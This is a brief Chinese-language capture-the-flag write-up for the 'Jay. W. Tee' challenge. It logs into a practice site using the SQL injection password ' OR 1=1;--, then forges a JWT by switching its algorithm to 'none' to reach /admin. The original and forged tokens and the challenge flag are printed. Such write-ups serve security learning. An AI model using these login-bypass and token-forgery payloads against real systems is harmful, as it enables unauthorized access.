# Jay. W. Tee

## 題目描述

Mr. Jay W. Tee seems to think his website is pretty secure.

https://lt560zwl9uv6.boroctf.com/

## 解題思路

進去以後嘗試 sql injection，帳號用 `admin`，密碼用 `' OR 1=1;--`，然後就登入了

之後拿到一個 JWT，嘗試爆破它的 secret，但是失敗了

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.CQTNZMNpCfnOH77zxgTiJOHoS86V99_JsiAF3az3dEo
```

之後想說試試看把 alg 改成 none 會不會給過，結果還真過了，進到 `/admin` 即可得到 flag

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.
```

## Flag

```text
boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}
```
